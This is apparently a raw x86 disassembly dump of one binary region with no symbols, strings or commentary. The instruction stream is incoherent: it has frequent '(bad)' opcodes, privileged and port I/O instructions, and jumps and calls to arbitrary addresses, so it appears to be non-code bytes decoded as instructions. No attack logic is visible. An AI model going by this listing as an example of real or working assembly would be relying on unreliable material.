  40ebfa:	mov    ebx,0xe189c048
  40ebff:	rol    BYTE PTR [esi+0x3],0x5
  40ec03:	arpl   sp,bx
  40ec05:	imul   edx,DWORD PTR [eax],0x95f19294
  40ec0b:	clc    
  40ec0c:	inc    ebp
  40ec0d:	xlat   BYTE PTR ds:[bx]
  40ec0f:	inc    edi
  40ec10:	mov    ecx,0xb389ceee
  40ec15:	jns    0x40ec87
  40ec17:	aas    
  40ec18:	fisttp QWORD PTR [edx+0x72]
  40ec1b:	pushf  
  40ec1c:	mov    DWORD PTR [eax],ecx
  40ec1e:	hlt    
  40ec1f:	gs sar DWORD PTR cs:[edx],cl
  40ec23:	mov    ds:0xe8d58e27,al
  40ec28:	(bad)  
  40ec29:	pop    ds
  40ec2a:	cmp    BYTE PTR [edx+0x77c423e6],bh
  40ec30:	idiv   DWORD PTR [ecx]
  40ec32:	jmp    0x40ebd6
  40ec34:	popf   
  40ec35:	xchg   ecx,eax
  40ec36:	pop    ss
  40ec37:	xchg   esi,eax
  40ec38:	dec    ebx
  40ec39:	mov    esp,0x65946ab6
  40ec3e:	mov    eax,0x440b567
  40ec43:	and    cl,BYTE PTR [edi+0x19]
  40ec46:	push   eax
  40ec47:	adc    al,0xf1
  40ec49:	sbb    dh,BYTE PTR [ebp+0x3c]
  40ec4c:	ss xchg edi,eax
  40ec4e:	pop    ebx
  40ec4f:	dec    esi
  40ec50:	call   0xd37194f0
  40ec55:	lahf   
  40ec56:	sbb    esi,DWORD PTR [edi+0x3b911e1e]
  40ec5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec5d:	sbb    edi,edi
  40ec5f:	rcl    DWORD PTR [edi-0x54143a9],1
  40ec65:	test   DWORD PTR [ebx],ebp
  40ec67:	call   0xab03:0xef3d4cb5
  40ec6e:	push   ebp
  40ec6f:	daa    
  40ec70:	mov    edi,0x55c6db32
  40ec75:	cmp    ebp,DWORD PTR ds:0x251c26ab
  40ec7b:	xor    al,BYTE PTR [eax-0x30abf445]
  40ec81:	es jnp 0x40ec05
  40ec84:	and    DWORD PTR [eax-0x6188ffb4],0xc8a78aa8
  40ec8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec8f:	cld    
  40ec90:	mov    BYTE PTR [ecx],0xa4
  40ec93:	iret   
  40ec94:	xor    edi,ecx
  40ec96:	mov    edi,0xb8c9a4da
  40ec9b:	pop    ecx
  40ec9c:	gs fs lahf 
  40ec9f:	sbb    eax,0x3fb478e9
  40eca4:	push   esp
  40eca5:	into   
  40eca6:	dec    esp
  40eca7:	out    dx,eax
  40eca8:	push   ss
  40eca9:	loope  0x40ecec
  40ecab:	pop    ebp
  40ecac:	or     bh,dh
  40ecae:	lahf   
  40ecaf:	clc    
  40ecb0:	js     0x40ec65
  40ecb2:	iret   
  40ecb3:	nop    DWORD PTR [ebp+0x57066a3b]
  40ecba:	cwde   
  40ecbb:	pop    esp
  40ecbc:	mov    esp,0x52787007
  40ecc1:	pop    esp
  40ecc2:	adc    BYTE PTR cs:[edi+ecx*1],dh
  40ecc6:	mov    fs,WORD PTR [ebp-0x7]
  40ecc9:	ss int 0xc9
  40eccc:	dec    ebp
  40eccd:	sbb    DWORD PTR [edi-0x1c4a27c6],esp
  40ecd3:	pop    edx
  40ecd4:	mov    BYTE PTR [edi-0x4e81751b],ah
  40ecda:	xchg   esi,eax
  40ecdb:	inc    ebp
  40ecdc:	imul   edx,DWORD PTR [ebp+0x28e08a30],0xffffffe8
  40ece3:	cs (bad) 
  40ece5:	lahf   
  40ece6:	in     al,dx
  40ece7:	inc    ebx
  40ece8:	xor    al,0x58
  40ecea:	xor    edi,DWORD PTR [ecx+edi*1]
  40eced:	adc    DWORD PTR [ebp+ebx*1-0x297b8b64],0x433e7007
  40ecf8:	test   al,0x31
  40ecfa:	sub    DWORD PTR [ebp-0x4c4220eb],0x1786b122
  40ed04:	daa    
  40ed05:	xchg   esi,eax
  40ed06:	dec    ebx
  40ed07:	fs xor eax,0x7530f99
  40ed0d:	sub    eax,0x2be510b2
  40ed12:	jae    0x40ec9f
  40ed14:	clc    
  40ed15:	aaa    
  40ed16:	xchg   ebx,eax
  40ed17:	lahf   
  40ed18:	sub    al,0xbc
  40ed1a:	in     eax,dx
  40ed1b:	pop    ebp
  40ed1c:	es pop ecx
  40ed1e:	sub    BYTE PTR ds:0xf25f855,dh
  40ed24:	ret    
  40ed25:	(bad)  
  40ed26:	int    0x87
  40ed28:	and    eax,0x683e59aa
  40ed2d:	pop    esp
  40ed2e:	lds    esi,FWORD PTR [ecx]
  40ed30:	xchg   edx,eax
  40ed31:	or     bh,dl
  40ed33:	cmp    dh,bh
  40ed35:	jbe    0x40ed84
  40ed37:	jge    0x40ecb9
  40ed39:	push   esp
  40ed3a:	push   ebp
  40ed3b:	jle    0x40ed58
  40ed3d:	retf   0x1a74
  40ed40:	dec    eax
  40ed41:	cwde   
  40ed42:	popf   
  40ed43:	int3   
  40ed44:	pop    es
  40ed45:	sar    DWORD PTR [edi+0xeaca507],cl
  40ed4b:	dec    ebx
  40ed4c:	pop    ebp
  40ed4d:	lods   eax,DWORD PTR ds:[esi]
  40ed4e:	inc    esi
  40ed4f:	cmp    BYTE PTR [ecx],ah
  40ed51:	push   ds
  40ed52:	icebp  
  40ed53:	out    dx,eax
  40ed54:	in     eax,dx
  40ed55:	mov    ch,0xcf
  40ed57:	push   ss
  40ed58:	xor    DWORD PTR [ecx-0x32],ebp
  40ed5b:	scas   al,BYTE PTR es:[edi]
  40ed5c:	or     edi,DWORD PTR [ebx-0x3d]
  40ed5f:	das    
  40ed60:	dec    esp
  40ed61:	(bad)  
  40ed62:	jbe    0x40ecf0
  40ed64:	and    BYTE PTR [edi-0x3e1408cb],ch
  40ed6a:	hlt    
  40ed6b:	xchg   ebx,eax
  40ed6c:	aad    0x66
  40ed6e:	jg     0x40ed7c
  40ed70:	shl    esp,1
  40ed72:	int    0x87
  40ed74:	mul    bl
  40ed76:	and    dl,dl
  40ed78:	out    dx,al
  40ed79:	sub    bh,BYTE PTR [ebp+0x172e50da]
  40ed7f:	inc    edx
  40ed80:	les    edi,FWORD PTR [ecx]
  40ed82:	push   edi
  40ed83:	inc    ecx
  40ed84:	sbb    BYTE PTR [edx+0x53],cl
  40ed87:	call   0x83d1671a
  40ed8c:	jl     0x40edd1
  40ed8e:	(bad)  
  40ed8f:	retf   
  40ed90:	jns    0x40ed6d
  40ed92:	add    al,0xd4
  40ed94:	outs   dx,DWORD PTR ds:[esi]
  40ed95:	mov    WORD PTR [esi],ss
  40ed97:	push   edi
  40ed98:	rcr    DWORD PTR [edi-0x59],1
  40ed9b:	jp     0x40ee19
  40ed9d:	xlat   BYTE PTR ds:[ebx]
  40ed9e:	mov    DWORD PTR [ebp-0x52524988],eax
  40eda4:	pusha  
  40eda5:	out    dx,al
  40eda6:	mov    esi,0xb52a10d1
  40edab:	add    al,0x25
  40edad:	out    0x9d,eax
  40edaf:	xchg   edx,eax
  40edb0:	pop    eax
  40edb1:	aam    0x93
  40edb3:	push   0x20d10093
  40edb8:	in     al,0xe7
  40edba:	mov    al,0xd
  40edbc:	retf   0x8b5c
  40edbf:	mov    ss,WORD PTR [ebp+0x56533bbd]
  40edc5:	pop    eax
  40edc6:	fs out 0x3a,eax
  40edc9:	sub    ecx,edx
  40edcb:	jnp    0x40edeb
  40edcd:	ins    DWORD PTR es:[edi],dx
  40edce:	and    eax,0x91a550c2
  40edd3:	bound  esp,QWORD PTR [eax-0x1bfe013b]
  40edd9:	repz imul edx,DWORD PTR [edx-0xd],0xffffffee
  40edde:	fmul   DWORD PTR [ebx]
  40ede0:	sbb    eax,ecx
  40ede2:	mov    edx,0x65fb26d5
  40ede7:	outs   dx,DWORD PTR ds:[esi]
  40ede8:	dec    esp
  40ede9:	pop    edx
  40edea:	mov    eax,esp
  40edec:	lock dec ebx
  40edee:	mov    esi,0x8c11cdbd
  40edf3:	outs   dx,DWORD PTR ds:[esi]
  40edf4:	jecxz  0x40ee35
  40edf6:	cwde   
  40edf7:	mov    edi,0x819ddfbf
  40edfc:	mov    cl,0xdf
  40edfe:	mov    al,ds:0x18d5c0d0
  40ee03:	dec    ecx
  40ee04:	mov    ecx,DWORD PTR [esp+ecx*8+0x4120773f]
  40ee0b:	ins    BYTE PTR es:[edi],dx
  40ee0c:	xor    esp,DWORD PTR [ecx+0x6ca0e9f]
  40ee12:	sub    eax,0xe1051559
  40ee17:	dec    ebx
  40ee18:	idiv   BYTE PTR [eax]
  40ee1a:	jl     0x40ee56
  40ee1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee1d:	mov    ah,0x72
  40ee1f:	(bad)  
  40ee20:	fimul  WORD PTR [ecx-0x7d5ceb53]
  40ee26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee27:	icebp  
  40ee28:	xor    al,0x8a
  40ee2a:	xchg   DWORD PTR [edi],ebx
  40ee2c:	jge    0x40edbf
  40ee2e:	test   DWORD PTR [eax+0x2e7d12ca],edx
  40ee34:	xchg   ecx,eax
  40ee35:	adc    al,0x11
  40ee37:	or     ch,BYTE PTR [esi+0x2f]
  40ee3a:	retf   
  40ee3b:	fiadd  DWORD PTR [ebx]
  40ee3d:	inc    esp
  40ee3e:	jmp    DWORD PTR [ebx+0x44]
  40ee41:	pop    eax
  40ee42:	(bad)  
  40ee43:	dec    esi
  40ee44:	dec    edx
  40ee45:	cmp    al,0xda
  40ee47:	mov    ebx,0xc29bedcb
  40ee4c:	(bad)  
  40ee4e:	cwde   
  40ee4f:	add    al,0x14
  40ee51:	and    BYTE PTR [ecx-0x16fa9662],dh
  40ee57:	stc    
  40ee58:	or     BYTE PTR [ebx*4+0x1aeb5582],cl
  40ee5f:	jno    0x40ee5b
  40ee61:	shr    DWORD PTR [ebp+0x732a14c2],1
  40ee67:	test   eax,0x12388261
  40ee6c:	and    al,0x4c
  40ee6e:	in     al,0xae
  40ee70:	pop    esp
  40ee71:	idiv   BYTE PTR [ebx+0x15]
  40ee74:	(bad)  
  40ee75:	dec    edx
  40ee76:	cmc    
  40ee77:	out    dx,al
  40ee78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee79:	pop    eax
  40ee7a:	mul    DWORD PTR [edx+eax*2+0x73]
  40ee7e:	imul   esi,esi,0x3fafbc54
  40ee84:	mov    al,0xbf
  40ee86:	dec    edi
  40ee87:	add    DWORD PTR [ecx-0x5f],eax
  40ee8a:	push   edx
  40ee8b:	mov    al,ds:0xb84f1364
  40ee90:	mov    cl,0x73
  40ee92:	inc    edx
  40ee93:	sub    ah,cl
  40ee95:	pop    esp
  40ee96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee97:	pop    ss
  40ee98:	mov    ebp,0x6c894afd
  40ee9d:	(bad)  
  40ee9e:	(bad)  
  40ee9f:	xlat   BYTE PTR ds:[ebx]
  40eea0:	dec    esi
  40eea1:	sub    DWORD PTR [ebp-0x53],0x3b
  40eea5:	push   ebp
  40eea6:	push   edi
  40eea7:	sar    ebp,0x1c
  40eeaa:	in     al,0xd4
  40eeac:	ror    DWORD PTR [edi+edi*8+0x1d],1
  40eeb0:	add    DWORD PTR [ebp+0x40635386],0x78
  40eeb7:	arpl   di,ax
  40eeb9:	mov    esp,0xe0c388e2
  40eebe:	call   FWORD PTR [eax-0x80]
  40eec1:	xchg   DWORD PTR [edx],ebx
  40eec3:	rol    DWORD PTR [ecx],cl
  40eec5:	mov    ds:0x7b2a109c,al
  40eeca:	sti    
  40eecb:	leave  
  40eecc:	js     0x40ef15
  40eece:	lods   eax,DWORD PTR ds:[esi]
  40eecf:	cmp    al,0x97
  40eed1:	dec    edi
  40eed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eed3:	cli    
  40eed4:	or     edx,edi
  40eed6:	fcom   DWORD PTR [edx]
  40eed8:	dec    esi
  40eed9:	add    al,0xa
  40eedb:	ret    
  40eedc:	jb     0x40eed4
  40eede:	adc    DWORD PTR [edx+0x3f6d58a3],ecx
  40eee4:	mov    es,WORD PTR [edx+ecx*8+0x4a670056]
  40eeeb:	mov    DWORD PTR [edx+edx*8-0x72],0x4dedbd16
  40eef3:	imul   ebx,ebx,0x48
  40eef6:	ror    DWORD PTR [esi+0x34],1
  40eef9:	xor    eax,DWORD PTR [ebp+0x72]
  40eefc:	mov    bl,cl
  40eefe:	push   esp
  40eeff:	pop    esi
  40ef00:	psrlw  mm7,QWORD PTR [ebp+0x6d]
  40ef04:	sbb    BYTE PTR [eax+0x4c],0xd1
  40ef08:	inc    esi
  40ef09:	dec    BYTE PTR [edi]
  40ef0b:	dec    ebx
  40ef0c:	cmp    DWORD PTR [ecx+0x3a682a43],esi
  40ef12:	fidivr DWORD PTR [edx]
  40ef14:	cmp    BYTE PTR [edi+0x26],0xb
  40ef18:	pop    esi
  40ef19:	mov    edx,0x412d7afb
  40ef1e:	mov    gs,WORD PTR [edx]
  40ef20:	aas    
  40ef21:	mov    al,ds:0x728b889c
  40ef26:	fsub   st,st(1)
  40ef28:	ins    DWORD PTR es:[edi],dx
  40ef29:	sti    
  40ef2a:	inc    esi
  40ef2b:	adc    BYTE PTR [ebp-0x5c],0xe
  40ef2f:	mov    cl,0x79
  40ef31:	mov    edx,DWORD PTR [ebx+0x25]
  40ef34:	inc    eax
  40ef35:	not    DWORD PTR [ebx*4-0x45417623]
  40ef3c:	imul   edi,DWORD PTR [edx+esi*8-0x2f],0xd6c4530c
  40ef44:	xor    ah,BYTE PTR [edx-0x256a4fa3]
  40ef4a:	jge    0x40efb4
  40ef4c:	mov    ebp,0xc4c660a4
  40ef51:	add    DWORD PTR [ebx-0x626bccc1],ebp
  40ef57:	mov    esi,0xdb72fde2
  40ef5c:	jp     0x40ef33
  40ef5e:	bound  esi,QWORD PTR [esi+eiz*2]
  40ef61:	mov    BYTE PTR [edx-0x37ea61c6],al
  40ef67:	jns    0x40efb8
  40ef69:	lods   al,BYTE PTR ds:[esi]
  40ef6a:	bound  ebp,QWORD PTR [eax]
  40ef6c:	ja     0x40efcd
  40ef6e:	jnp    0x40ef5c
  40ef70:	jl     0x40ef65
  40ef72:	fs lahf 
  40ef74:	jecxz  0x40ef63
  40ef76:	mov    ebp,0x83bab634
  40ef7b:	out    dx,eax
  40ef7c:	loopne 0x40ef61
  40ef7e:	mov    dl,0x10
  40ef80:	leave  
  40ef81:	cli    
  40ef82:	xor    DWORD PTR [edi+0x77],0xffffffe1
  40ef86:	out    dx,eax
  40ef87:	fnstsw WORD PTR [esi-0x6b]
  40ef8a:	loop   0x40f003
  40ef8c:	clc    
  40ef8d:	push   0x35663812
  40ef92:	sbb    ebx,DWORD PTR [ebx+0x55]
  40ef95:	in     eax,dx
  40ef96:	not    eax
  40ef98:	or     bl,BYTE PTR [ecx-0x3720faa0]
  40ef9e:	or     DWORD PTR [edi+0xc],0xffffffda
  40efa2:	cmp    eax,esi
  40efa4:	hlt    
  40efa5:	fdivr  DWORD PTR [ebx]
  40efa7:	jno    0x40ef9f
  40efa9:	xlat   BYTE PTR ds:[ebx]
  40efaa:	dec    ecx
  40efab:	shr    DWORD PTR [ecx+0x454989c3],1
  40efb1:	repz mov eax,0x9fa23dd8
  40efb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efb8:	mov    eax,0x6418bcc2
  40efbd:	rol    al,1
  40efbf:	dec    eax
  40efc0:	cmp    eax,eax
  40efc2:	mov    al,0x57
  40efc4:	push   ecx
  40efc5:	(bad)  
  40efc6:	xlat   BYTE PTR ds:[ebx]
  40efc7:	mov    ch,0x96
  40efc9:	mov    al,0x3d
  40efcb:	xchg   edx,eax
  40efcc:	das    
  40efcd:	stos   BYTE PTR es:[edi],al
  40efce:	mov    esp,0xd51fe88e
  40efd3:	cmp    esp,DWORD PTR [ecx-0x6361148a]
  40efd9:	cmp    BYTE PTR [eax],al
  40efdb:	mov    esp,0x6b550b50
  40efe0:	jp     0x40efb4
  40efe2:	loop   0x40efe2
  40efe4:	and    cx,sp
  40efe7:	add    DWORD PTR [edx+0x41],eax
  40efea:	inc    ebx
  40efeb:	pop    ds
  40efec:	xchg   esp,eax
  40efed:	mov    ecx,0xd9de193a
  40eff2:	fcomp  QWORD PTR [eax+0x35]
  40eff5:	in     al,dx
  40eff6:	add    DWORD PTR [edx],0xd364b13c
  40effc:	cmp    ebp,DWORD PTR [ebx]
  40effe:	jmp    0x2f74af9c
  40f003:	cmp    BYTE PTR [esi],ah
  40f005:	jbe    0x40f026
  40f007:	retf   0x88ee
  40f00a:	es xchg edx,eax
  40f00c:	enter  0xae82,0x81
  40f010:	gs pop esp
  40f012:	sbb    DWORD PTR [ebp+ebx*1+0x356b175],edi
  40f019:	in     eax,dx
  40f01a:	jle    0x40f072
  40f01c:	xor    bh,ah
  40f01e:	js     0x40f070
  40f020:	sbb    al,0xf3
  40f022:	push   es
  40f023:	or     ch,BYTE PTR [edx]
  40f025:	inc    ebp
  40f026:	(bad)  
  40f028:	push   ss
  40f029:	xor    eax,0xebd62160
  40f02e:	add    DWORD PTR [esi+0x172c04c9],esi
  40f034:	(bad)  
  40f035:	or     DWORD PTR [edi+0x5c],esi
  40f038:	cmp    BYTE PTR [ebp+eax*4+0x1b],0xd4
  40f03d:	js     0x40efc1
  40f03f:	sti    
  40f040:	iret   
  40f041:	xchg   ecx,eax
  40f042:	mov    BYTE PTR [ecx-0x870b611],bh
  40f048:	mov    ch,0x74
  40f04a:	into   
  40f04b:	and    eax,0xf5aa85d0
  40f050:	pop    esi
  40f051:	mov    cr1,ebx
  40f054:	lahf   
  40f055:	sbb    esp,DWORD PTR [ecx+0x34ff734b]
  40f05b:	das    
  40f05c:	shl    BYTE PTR [ebx],1
  40f05e:	and    dh,BYTE PTR [edi-0x7f599b7]
  40f064:	add    bl,bl
  40f066:	test   edi,ecx
  40f068:	outs   dx,BYTE PTR ds:[esi]
  40f06a:	pushf  
  40f06b:	jbe    0x40f0be
  40f06d:	sub    eax,0xea3aadbf
  40f072:	push   ebx
  40f074:	in     eax,0xe8
  40f076:	inc    edi
  40f077:	jmp    0x28e2:0x3673e8e2
  40f07e:	cmp    edi,DWORD PTR [eax+0x515e85c8]
  40f084:	dec    esp
  40f085:	inc    esp
  40f086:	cmp    bh,bl
  40f088:	mov    dl,0xde
  40f08a:	pop    edx
  40f08b:	(bad)  
  40f08c:	sub    eax,0x87c350af
  40f091:	out    dx,eax
  40f092:	sub    ecx,esi
  40f094:	sub    eax,0x4188e1b1
  40f099:	mov    eax,0x19c6482a
  40f09e:	imul   DWORD PTR [ebp+0x21]
  40f0a1:	jle    0x40f040
  40f0a3:	fild   QWORD PTR [edx]
  40f0a5:	sbb    bl,BYTE PTR [ecx+0x18]
  40f0a8:	dec    esi
  40f0a9:	sbb    al,0x31
  40f0ab:	jbe    0x40f0a6
  40f0ad:	xlat   BYTE PTR ds:[ebx]
  40f0ae:	or     al,0xc8
  40f0b0:	popa   
  40f0b1:	cld    
  40f0b2:	mov    al,0x43
  40f0b4:	jno    0x40f11a
  40f0b6:	leave  
  40f0b7:	enter  0x3325,0x58
  40f0bb:	retf   
  40f0bc:	pop    eax
  40f0bd:	mov    esp,0x23d9cf75
  40f0c2:	das    
  40f0c3:	shl    DWORD PTR [ecx+0x6f],0x59
  40f0c7:	test   BYTE PTR ds:0x4b87bbc3,ch
  40f0cd:	dec    eax
  40f0ce:	sbb    eax,0x70080419
  40f0d3:	ja     0x40f13c
  40f0d5:	lods   al,BYTE PTR ds:[esi]
  40f0d6:	cmp    al,0x18
  40f0d8:	jmp    0x6ec4:0xb24697
  40f0df:	sub    eax,0x6d626cd3
  40f0e4:	mov    ds,WORD PTR [edi-0x36]
  40f0e7:	and    eax,0x9371df8
  40f0ec:	ins    BYTE PTR es:[edi],dx
  40f0ed:	arpl   WORD PTR [ebp+0x21],ax
  40f0f0:	dec    ecx
  40f0f1:	pop    eax
  40f0f2:	or     al,BYTE PTR [eax]
  40f0f4:	mov    ds:0xc8b1b3e2,eax
  40f0f9:	das    
  40f0fa:	cmp    ecx,DWORD PTR [ebx+0xc]
  40f0fd:	jne    0x40f117
  40f0ff:	pop    ds
  40f100:	out    0x15,eax
  40f102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f103:	xchg   ebx,eax
  40f104:	cmp    BYTE PTR [ebx],ch
  40f106:	cmp    eax,0x73625931
  40f10b:	cli    
  40f10c:	xor    edi,esp
  40f10e:	aam    0x69
  40f110:	mov    bh,0xd8
  40f112:	xor    al,BYTE PTR [esi+0x4f]
  40f115:	mov    bl,0x12
  40f117:	ret    
  40f118:	sbb    eax,0xe84e2e5c
  40f11d:	and    DWORD PTR [esi],edi
  40f11f:	(bad)  
  40f120:	xor    edx,DWORD PTR ds:0x9120b2c0
  40f126:	fsubr  DWORD PTR [edx+0x2c9384b3]
  40f12c:	dec    ebp
  40f12d:	pop    ebx
  40f12e:	(bad)  
  40f12f:	popa   
  40f130:	imul   edx,DWORD PTR [edx-0x57577b6c],0xde97dc2a
  40f13a:	and    dl,al
  40f13c:	mov    edx,0x95e5f492
  40f141:	jno    0x40f1a3
  40f143:	cdq    
  40f144:	call   0xc6ca6383
  40f149:	mov    ah,0x83
  40f14b:	test   DWORD PTR [ebx-0x68],ecx
  40f14e:	not    DWORD PTR [ecx+edx*1]
  40f151:	adc    al,ah
  40f153:	or     dl,bh
  40f155:	fiadd  WORD PTR [ebx-0x2b]
  40f158:	lods   eax,DWORD PTR ds:[esi]
  40f159:	mov    ebx,0x8d65d845
  40f15e:	in     al,dx
  40f15f:	out    dx,al
  40f160:	inc    esi
  40f161:	pop    ecx
  40f162:	cmp    DWORD PTR [ebx],esp
  40f164:	xchg   esi,eax
  40f165:	cmp    BYTE PTR [edx],al
  40f167:	mov    esp,0x8df1f127
  40f16c:	ficomp WORD PTR [ebp+0x55c532d2]
  40f172:	hlt    
  40f173:	(bad)
  40f176:	and    BYTE PTR [ecx+0x2a55e583],ah
  40f17c:	xor    ah,BYTE PTR [ecx+0x3a7cdf5]
  40f182:	mul    eax
  40f184:	push   ss
  40f185:	in     eax,dx
  40f186:	xor    ebp,DWORD PTR [edi-0xf]
  40f189:	hlt    
  40f18a:	xchg   bl,dl
  40f18c:	fiadd  DWORD PTR [ebp-0x6a5932b3]
  40f192:	es scas eax,DWORD PTR es:[edi]
  40f194:	mov    ds:0x1ed65e00,eax
  40f199:	int    0x5f
  40f19b:	cmp    dl,BYTE PTR [ebp-0x280cf021]
  40f1a1:	add    al,0x24
  40f1a3:	pop    edi
  40f1a4:	jne    0x40f1ad
  40f1a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1a7:	div    DWORD PTR [edx-0x2c]
  40f1aa:	les    esi,FWORD PTR [edi-0x68]
  40f1ad:	pop    edx
  40f1ae:	mov    ebp,0x96375b74
  40f1b3:	std    
  40f1b4:	mov    ebx,0x98a2da79
  40f1b9:	stc    
  40f1ba:	pop    es
  40f1bb:	lahf   
  40f1bc:	xchg   ebx,eax
  40f1bd:	lahf   
  40f1be:	ja     0x40f140
  40f1c0:	push   ebp
  40f1c1:	lds    ebx,FWORD PTR [eax-0x53]
  40f1c4:	js     0x40f1c7
  40f1c6:	test   eax,0x563ede6b
  40f1cb:	xor    bl,al
  40f1cd:	or     al,0xa
  40f1cf:	inc    eax
  40f1d0:	sbb    eax,0xbc346620
  40f1d5:	or     al,0xcb
  40f1d7:	fiadd  WORD PTR [edx+0x5e]
  40f1da:	mov    ch,0x65
  40f1dc:	xor    esp,DWORD PTR [ebx-0x35a39cf]
  40f1e2:	and    BYTE PTR [edi-0x56e3e795],ch
  40f1e8:	mov    al,dl
  40f1ea:	mov    eax,0x82e9801d
  40f1ef:	out    dx,al
  40f1f0:	add    eax,0xb66f69ac
  40f1f5:	icebp  
  40f1f6:	jnp    0x40f1a9
  40f1f8:	sbb    al,0x11
  40f1fa:	pop    DWORD PTR [ecx-0x59770968]
  40f200:	xchg   esi,eax
  40f201:	clc    
  40f202:	xor    DWORD PTR [eax-0x43],edi
  40f205:	mov    DWORD PTR [ebp+0x40],ebp
  40f208:	adc    ebx,DWORD PTR [ebp-0x3a14bbe3]
  40f20e:	gs or  bl,ah
  40f211:	push   ebx
  40f212:	lock pop ss
  40f214:	retf   
  40f215:	inc    edi
  40f216:	push   ds
  40f217:	mov    bh,0xef
  40f219:	mov    dh,0xf7
  40f21b:	sbb    DWORD PTR ds:0x49710b81,ecx
  40f221:	mov    eax,0x6ca183d0
  40f226:	sahf   
  40f227:	adc    DWORD PTR [ecx],ebx
  40f229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f22a:	and    cl,cl
  40f22c:	push   edi
  40f22d:	adc    ch,cl
  40f22f:	imul   DWORD PTR [edi+0x58]
  40f232:	sub    DWORD PTR [esi-0x3c02e4ce],0x22
  40f239:	int3   
  40f23a:	dec    ebx
  40f23b:	xchg   esi,eax
  40f23c:	jmp    0x40f24b
  40f23e:	pop    ebx
  40f23f:	lods   al,BYTE PTR ds:[esi]
  40f240:	xchg   BYTE PTR [eax+ecx*2+0x2ac45fe2],dl
  40f247:	retf   0x6e38
  40f24a:	dec    esi
  40f24b:	pop    ecx
  40f24c:	das    
  40f24d:	rol    DWORD PTR [edi+0x38],cl
  40f250:	xchg   ebp,eax
  40f251:	xchg   ebx,eax
  40f252:	ret    
  40f253:	cdq    
  40f254:	xchg   esp,eax
  40f255:	pop    es
  40f256:	hlt    
  40f257:	data16 ins BYTE PTR es:[edi],dx
  40f259:	sub    al,0x13
  40f25b:	pop    eax
  40f25c:	(bad)  
  40f25d:	les    edi,FWORD PTR [edx+0x4ca9fd11]
  40f263:	mov    DWORD PTR [esi],ebx
  40f265:	test   al,0x74
  40f267:	cmp    bh,0x86
  40f26a:	out    0x6a,al
  40f26c:	jmp    0x2021:0xc4a20919
  40f273:	mov    al,0xcb
  40f275:	(bad)
  40f278:	call   0xb9f5:0xc9c70d6c
  40f27f:	mov    ebp,0x4f1e9f2e
  40f284:	cmp    DWORD PTR [edi],0xedf53c
  40f28a:	xor    DWORD PTR [eax+0x30b3934c],ebp
  40f290:	xor    eax,0x9799c99e
  40f295:	std    
  40f296:	inc    esi
  40f297:	out    0x5f,eax
  40f299:	or     cl,BYTE PTR [edi]
  40f29b:	ja     0x40f2c4
  40f29d:	pop    es
  40f29e:	(bad)  
  40f29f:	jle    0x40f2a3
  40f2a1:	scas   al,BYTE PTR es:[edi]
  40f2a2:	dec    bp
  40f2a4:	repz sub al,BYTE PTR [edx+ebx*4-0x37]
  40f2a9:	inc    edx
  40f2aa:	and    BYTE PTR [esp+ecx*8],bl
  40f2ad:	call   0xc57c:0x33b8b919
  40f2b4:	pop    ss
  40f2b5:	int3   
  40f2b6:	mov    edi,0x2ebc6fd6
  40f2bb:	pop    es
  40f2bc:	js     0x40f32f
  40f2be:	mov    ds:0x61f74516,al
  40f2c3:	jecxz  0x40f312
  40f2c5:	sbb    DWORD PTR [esi],esi
  40f2c7:	mov    cl,al
  40f2c9:	sar    BYTE PTR [edx],cl
  40f2cb:	xchg   DWORD PTR [ebx-0x29471dc7],ebx
  40f2d1:	jno    0x40f25a
  40f2d3:	or     ah,BYTE PTR [ebp+0x7c]
  40f2d6:	mov    esp,0x568e597
  40f2db:	sahf   
  40f2dc:	xor    al,0x7d
  40f2de:	jno    0x40f27d
  40f2e0:	ret    
  40f2e1:	pop    ds
  40f2e2:	mov    cl,0xa
  40f2e4:	es scas eax,DWORD PTR es:[edi]
  40f2e6:	lods   al,BYTE PTR ds:[esi]
  40f2e7:	jmp    0x40f341
  40f2e9:	inc    eax
  40f2ea:	pop    ebx
  40f2eb:	outs   dx,BYTE PTR ds:[esi]
  40f2ec:	mov    fs,esp
  40f2ee:	sbb    al,0x11
  40f2f0:	mov    edx,0x1812d531
  40f2f5:	pop    edi
  40f2f6:	cmp    bh,BYTE PTR [esi]
  40f2f8:	loope  0x40f301
  40f2fa:	(bad)  
  40f2fb:	aaa    
  40f2fc:	aaa    
  40f2fd:	popf   
  40f2fe:	xchg   esp,eax
  40f2ff:	in     al,0x14
  40f301:	mov    ebx,DWORD PTR [edx+0x54146d48]
  40f307:	add    DWORD PTR [ecx],0xffffffce
  40f30a:	shr    ebx,0x2c
  40f30d:	jg     0x40f30a
  40f30f:	fs mov edi,0x9fe1938e
  40f315:	sub    BYTE PTR [esi-0x2bb473f0],0x87
  40f31c:	mov    dl,0xe8
  40f31e:	iret   
  40f31f:	cmc    
  40f320:	es jae 0x40f31b
  40f323:	neg    DWORD PTR [esi+0x6f]
  40f326:	or     BYTE PTR [eax],0x48
  40f329:	xor    al,0x9a
  40f32b:	xor    eax,0x6ec0cfaa
  40f330:	repnz sar BYTE PTR [edi],1
  40f333:	je     0x40f30f
  40f335:	rol    ecx,1
  40f337:	fild   QWORD PTR [edi]
  40f339:	stos   BYTE PTR es:[edi],al
  40f33a:	int3   
  40f33b:	jno    0x40f398
  40f33d:	cmp    dl,BYTE PTR [esi]
  40f33f:	mov    BYTE PTR [ecx],dl
  40f341:	adc    BYTE PTR [ebx+0x4],bh
  40f344:	bound  ebp,QWORD PTR [ecx+0x61]
  40f347:	inc    esp
  40f348:	xchg   BYTE PTR [edx],dl
  40f34a:	dec    eax
  40f34b:	sti    
  40f34c:	jb     0x40f3bc
  40f34e:	xchg   edx,eax
  40f34f:	int3   
  40f350:	rol    ebp,0xf5
  40f353:	dec    eax
  40f354:	inc    esi
  40f355:	adc    bh,bh
  40f357:	or     BYTE PTR [esp+ebp*1-0x1b],0xfa
  40f35c:	or     al,0xcb
  40f35e:	test   al,0x53
